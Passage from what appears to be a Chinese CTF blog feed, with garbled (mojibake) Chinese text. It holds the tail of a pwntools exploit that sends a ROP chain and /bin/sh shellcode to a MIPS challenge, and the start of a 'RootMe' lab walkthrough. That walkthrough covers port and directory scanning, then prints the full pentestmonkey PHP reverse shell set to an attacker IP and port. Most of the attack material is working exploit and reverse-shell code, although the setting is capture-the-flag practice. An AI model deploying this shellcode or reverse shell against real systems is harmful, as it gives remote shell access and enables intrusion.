punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span>    <span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"mips"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./challenge"</span>context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">'little'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">11</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./challenge'</span><span class="token punctuation">)</span><span class="token comment">#io=process(["qemu-mipsel","-g","1234","./challenge"])</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27654</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'your passphrase: '</span><span class="token punctuation">,</span><span class="token string">'ä¸‰å…ƒä¸€ä¸²åå…ƒä¸‰ä¸²'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gadget1<span class="token operator">=</span><span class="token number">0x0043965C</span>gadget2<span class="token operator">=</span><span class="token number">0x0040ABB8</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span><span class="token string">b"\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x1c\x00\xe4\x27\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00"</span>payload<span class="token operator">+=</span>shellcodesla<span class="token punctuation">(</span><span class="token string">'Congratulation!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#sh=gdb.debug('./challenge')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/44555ff10a39e563491b43b4c2424101_MD5.jpeg"></p><h2 id="fakeSSDP"><a href="#fakeSSDP" class="headerlink" title="fakeSSDP"></a>fakeSSDP</h2><blockquote><p>è¿™ä¸ªã€‚ã€‚ã€‚ä»¥åå†è¯´</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RootMe</title>
      <link href="/2023/12/11/RootMe/"/>
      <url>/2023/12/11/RootMe/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è™½ç„¶æ˜¯ä¸ªå¾ˆç®€å•çš„é¶æœºï¼Œä¸è¿‡ç¬¬ä¸€æ¬¡æ‰“é¶è¿˜æ˜¯è›®å…´å¥‹çš„ğŸ˜„</p></blockquote><p>è¿ä¸Šopenvpnï¼Œå¼€æ‰“ï¼<br><img src="/Red_FILE/474d2d981958756fd3c943c2278eb3b0_MD5.jpeg"></p><h1 id="ä¾¦å¯Ÿ"><a href="#ä¾¦å¯Ÿ" class="headerlink" title="ä¾¦å¯Ÿ"></a>ä¾¦å¯Ÿ</h1><p><img src="/Red_FILE/5298d7842e074db29aa04d4f9d23c7cf_MD5.jpeg"></p><ol><li>æœºå™¨æ‰“å¼€äº†å‡ ä¸ªç«¯å£ï¼Ÿç­”ï¼š2</li></ol><p>-sVæ¢æµ‹ä¸‹æœåŠ¡<br><img src="/Red_FILE/9142dbcbf87e22ff8a55f8185b6858b2_MD5.jpeg"><br>2. æ­£åœ¨è¿è¡Œå“ªä¸ªç‰ˆæœ¬çš„ Apacheï¼Ÿç­”ï¼š2.4.29<br>åŒä¸Š</p><ol start="3"><li><p>ç«¯å£ 22 ä¸Šè¿è¡Œä»€ä¹ˆæœåŠ¡ï¼Ÿç­”ï¼šssh<br>åŒä¸Š</p></li><li><p>ä½¿ç”¨ GoBuster å·¥å…·åœ¨ Web æœåŠ¡å™¨ä¸ŠæŸ¥æ‰¾ç›®å½•ï¼Œä»€ä¹ˆæ˜¯éšè—ç›®å½•ï¼Ÿç­”ï¼š&#x2F;panel&#x2F;<br><img src="/Red_FILE/188709e15b343a358ba3f49e673173a2_MD5.jpeg"></p></li><li><p>&#x2F;panel&#x2F;å¼•èµ·äº†æˆ‘ä»¬çš„æ³¨æ„ï¼Œæ‰“å¼€çœ‹çœ‹<br><img src="/Red_FILE/a267a52473d71a460c03e803eb9adaa9_MD5.jpeg"></p></li><li><p>å¥½å®¶ä¼™ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p></li></ol><h1 id="è·å–shell"><a href="#è·å–shell" class="headerlink" title="è·å–shell"></a>è·å–shell</h1><ol><li>æ‰¾åˆ°ä¸€ä¸ªè¦ä¸Šä¼ çš„è¡¨å•å¹¶è·å–åå‘ shellï¼Œç„¶åæ‰¾åˆ°æ ‡å¿—user.txtã€‚</li></ol><p>æˆ‘ä»¬å·²çŸ¥æ˜¯phpç½‘ç«™ï¼Œæœ‰è¿™æ ·ä¸€ä¸ªphpåå¼¹shellçš„æœ¨é©¬æ¨¡æ¿<a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey&#x2F;php-reverse-shell (github.com)</a>ï¼š<br>æ”¹ä¸€ä¸‹æˆ‘ä»¬æ”»å‡»æœºipå’Œç›‘å¬ç«¯å£å³å¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">/</span> php<span class="token operator">-</span>reverse<span class="token operator">-</span>shell <span class="token operator">-</span> <span class="token constant">A</span> Reverse Shell implementation in <span class="token constant">PHP</span><span class="token operator">/</span> <span class="token function">Copyright</span> <span class="token punctuation">(</span><span class="token constant">C</span><span class="token punctuation">)</span> <span class="token number">2007</span> pentestmonkey@pentestmonkey<span class="token operator">.</span>net<span class="token operator">/</span><span class="token operator">/</span> This tool may be used <span class="token keyword">for</span> legal purposes only<span class="token operator">.</span>  Users take full responsibility<span class="token operator">/</span> <span class="token keyword">for</span> any actions performed using this tool<span class="token operator">.</span>  The author accepts no liability<span class="token operator">/</span> <span class="token keyword">for</span> damage caused by this tool<span class="token operator">.</span>  <span class="token keyword">If</span> these terms are not acceptable to you<span class="token punctuation">,</span> then<span class="token operator">/</span> <span class="token keyword">do</span> not <span class="token keyword">use</span> <span class="token package">this</span> tool<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> In all other respects the <span class="token constant">GPL</span> version <span class="token number">2</span> applies<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span> This program is free software<span class="token punctuation">;</span> you can redistribute it <span class="token keyword">and</span><span class="token operator">/</span><span class="token keyword">or</span> modify<span class="token operator">/</span> it under the terms of the <span class="token constant">GNU</span> General <span class="token keyword">Public</span> License version <span class="token number">2</span> <span class="token keyword">as</span><span class="token operator">/</span> published by the Free Software Foundation<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> This program is distributed in the hope that it will be useful<span class="token punctuation">,</span><span class="token operator">/</span> but <span class="token constant">WITHOUT</span> <span class="token constant">ANY</span> <span class="token constant">WARRANTY</span><span class="token punctuation">;</span> without even the implied warranty of<span class="token operator">/</span> <span class="token constant">MERCHANTABILITY</span> <span class="token keyword">or</span> <span class="token constant">FITNESS</span> <span class="token keyword">FOR</span> <span class="token constant">A</span> <span class="token constant">PARTICULAR</span> <span class="token constant">PURPOSE</span><span class="token operator">.</span>  See the<span class="token operator">/</span> <span class="token constant">GNU</span> General <span class="token keyword">Public</span> License <span class="token keyword">for</span> more details<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> You should have received a copy of the <span class="token constant">GNU</span> General <span class="token keyword">Public</span> License along<span class="token operator">/</span> with this program<span class="token punctuation">;</span> <span class="token keyword">if</span> not<span class="token punctuation">,</span> write to the Free Software Foundation<span class="token punctuation">,</span> Inc<span class="token operator">.</span><span class="token punctuation">,</span><span class="token operator">/</span> <span class="token number">51</span> Franklin Street<span class="token punctuation">,</span> Fifth Floor<span class="token punctuation">,</span> Boston<span class="token punctuation">,</span> <span class="token constant">MA</span> <span class="token number">02110</span><span class="token operator">-</span><span class="token number">1301</span> <span class="token constant">USA</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> This tool may be used <span class="token keyword">for</span> legal purposes only<span class="token operator">.</span>  Users take full responsibility<span class="token operator">/</span> <span class="token keyword">for</span> any actions performed using this tool<span class="token operator">.</span>  <span class="token keyword">If</span> these terms are not acceptable to<span class="token operator">/</span> you<span class="token punctuation">,</span> then <span class="token keyword">do</span> not <span class="token keyword">use</span> <span class="token package">this</span> tool<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> You are encouraged to send comments<span class="token punctuation">,</span> improvements <span class="token keyword">or</span> suggestions to<span class="token operator">/</span> me at pentestmonkey@pentestmonkey<span class="token operator">.</span>net<span class="token operator">/</span><span class="token operator">/</span> Description<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">/</span> This script will make an outbound <span class="token constant">TCP</span> connection to a hardcoded <span class="token constant">IP</span> <span class="token keyword">and</span> port<span class="token operator">.</span><span class="token operator">/</span> The recipient will be given a shell running <span class="token keyword">as</span> the current <span class="token function">user</span> <span class="token punctuation">(</span>apache normally<span class="token punctuation">)</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> Limitations<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">/</span> proc_open <span class="token keyword">and</span> stream_set_blocking <span class="token keyword">require</span> <span class="token constant">PHP</span> version <span class="token number">4.3</span><span class="token operator">+</span><span class="token punctuation">,</span> <span class="token keyword">or</span> <span class="token number">5</span><span class="token operator">+</span><span class="token operator">/</span> <span class="token keyword">Use</span> <span class="token package">of</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token punctuation">)</span> on file descriptors returned by <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> will fail <span class="token keyword">and</span> <span class="token keyword">return</span> <span class="token constant boolean">FALSE</span> under Windows<span class="token operator">.</span><span class="token operator">/</span> Some compile<span class="token operator">-</span>time options are needed <span class="token keyword">for</span> <span class="token function">daemonisation</span> <span class="token punctuation">(</span>like pcntl<span class="token punctuation">,</span> posix<span class="token punctuation">)</span><span class="token operator">.</span>  These are rarely available<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> Usage<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">/</span> See http<span class="token punctuation">:</span><span class="token operator">/</span>pentestmonkey<span class="token operator">.</span>net<span class="token operator">/</span>tools<span class="token operator">/</span>php<span class="token operator">-</span>reverse<span class="token operator">-</span>shell <span class="token keyword">if</span> you get stuck<span class="token operator">.</span><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10.13.40.89'</span><span class="token punctuation">;</span>  <span class="token operator">/</span> <span class="token constant">CHANGE</span> <span class="token class-name type-declaration">THIS</span><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token operator">/</span> <span class="token constant">CHANGE</span> <span class="token class-name type-declaration">THIS</span><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span> Daemonise ourself <span class="token keyword">if</span> possible to avoid zombies later<span class="token operator">/</span><span class="token operator">/</span> pcntl_fork is hardly ever available<span class="token punctuation">,</span> but will allow us to daemonise<span class="token operator">/</span> our php process <span class="token keyword">and</span> avoid zombies<span class="token operator">.</span>  Worth a <span class="token keyword">try</span><span class="token operator">...</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">/</span> Fork <span class="token keyword">and</span> have the <span class="token keyword">parent</span> process <span class="token keyword">exit</span><span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">/</span> <span class="token keyword">Parent</span> exits<span class="token punctuation">&#125;</span><span class="token operator">/</span> Make the current process a session leader<span class="token operator">/</span> Will only succeed <span class="token keyword">if</span> we forked<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> Change to a safe directory<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span> Remove any umask we inherited<span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span> <span class="token keyword">Do</span> the reverse shell<span class="token operator">...</span><span class="token operator">/</span><span class="token operator">/</span> Open reverse <span class="token class-name type-declaration">connection</span><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> Spawn shell <span class="token class-name type-declaration">process</span><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token operator">/</span> stdin is a pipe that the child will read from   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token operator">/</span> stdout is a pipe that the child will write to   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token operator">/</span> stderr is a pipe that the child will write to<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> Set everything to non<span class="token operator">-</span>blocking<span class="token operator">/</span> Reason<span class="token punctuation">:</span> Occsionally reads will block<span class="token punctuation">,</span> even though stream_select tells us they won<span class="token string single-quoted-string">'tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) &#123;/ Check for end of TCP connectionif (feof($sock)) &#123;printit("ERROR: Shell connection terminated");break;&#125;/ Check for end of STDOUTif (feof($pipes[1])) &#123;printit("ERROR: Shell process terminated");break;&#125;/ Wait until a command is end down $sock, or some/ command output is available on STDOUT or STDERR$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);/ If we can read from the TCP socket, send/ data to process'</span>s <span class="token constant">STDIN</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> <span class="token keyword">If</span> we can read from the process<span class="token string single-quoted-string">'s STDOUT/ send data down tcp connectionif (in_array($pipes[1], $read_a)) &#123;if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);if ($debug) printit("STDOUT: $input");fwrite($sock, $input);&#125;/ If we can read from the process'</span>s <span class="token constant">STDERR</span><span class="token operator">/</span> send data down tcp connection<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span> Like <span class="token keyword">print</span><span class="token punctuation">,</span> but does nothing <span class="token keyword">if</span> we<span class="token string single-quoted-string">'ve daemonised ourself/ (I can'</span>t figure out how to redirect <span class="token constant">STDOUT</span> like a proper daemon<span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token 